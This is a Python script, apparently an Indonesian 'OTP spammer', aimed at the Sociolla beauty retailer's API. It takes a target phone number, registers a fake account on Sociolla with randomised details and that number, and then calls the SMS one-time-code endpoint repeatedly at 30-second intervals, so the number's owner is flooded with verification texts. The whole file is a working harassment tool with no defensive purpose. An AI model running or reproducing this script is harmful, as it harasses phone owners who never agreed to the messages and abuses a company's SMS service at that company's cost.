import requests, time
from random import randrange as rg

print("""
	[ SOCIOLLA OTP ]
	   - noobie -
""")

num=input("[In] Number: ")
jum=int(input("[In] Jumlah: "))

if num[0] == "0":
        num=num[1:]
elif num[0:2] == "62":
        num=num[2:]

headreg={
    "Host": "soco-api.sociolla.com",
    "Connection": "keep-alive",
    "Sec-Fetch-Mode": "cors",
    "Origin": "https://www.sociolla.com",
    "User-Agent": "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.06.4.5042",
    "Content-Type": "application/json;charset\u003dUTF-8",
    "Accept": "application/json, text/plain, */*",
    "session_id": "c970c955-79d1-45fd-840c-9082650a7a89",
    "SOC-PLATFORM": "sociolla-web-mobile",
    "Sec-Fetch-Site": "same-site",
    "Referer": "https://www.sociolla.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7",
    }

ses=requests.Session()
reg=ses.post("https://soco-api.sociolla.com/auth/register",
	json={"acquisition_source":"sociolla-web-mobile",
		"email":f"noobie{rg(9999)}@mail.com",
		"user_name":f"noobiegans{rg(9999)}",
		"password":f"noobie{rg(9999)}",
		"first_name":f"Noobie{rg(999)}",
		"last_name":f"Gans{rg(999)}",
		"gender":"Male",
		"salute":"Mr",
		"phone_no":num},
	headers=headreg)

token=reg.json()['data']['token']

headotp={
    "Host": "soco-api.sociolla.com",
    "Connection": "keep-alive",
    "Sec-Fetch-Mode": "cors",
    "Origin": "https://www.sociolla.com",
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json;charset\u003dUTF-8",
    "Accept": "application/json, text/plain, */*",
    "session_id": "c970c955-79d1-45fd-840c-9082650a7a89",
    "SOC-PLATFORM": "sociolla-web-mobile",
    "User-Agent": "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.06.4.5042",
    "Sec-Fetch-Site": "same-site",
    "Referer": "https://www.sociolla.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7",
    }

print("\n[RESULT]")
for x in range(jum):
	rotp=ses.post("https://soco-api.sociolla.com/auth/otp/code",
		json={"mode":"sms","entity":"phone_no"},
		headers=headotp).json()
#	print(rotp)
	if rotp["success"] == True:
		print(f"{x+1}. Berhasil {num}")
		for i in range(31):
			print(end=f"\r>> Sleep {30-i}s <<", flush=True)
			time.sleep(1)
		print()
	else:
		print(f"{x+1}. Gagal {num}")
		for i in range(31):
			print(end=f"\r>> Sleep {30-i}s <<", flush=True)
			time.sleep(1)
		print()
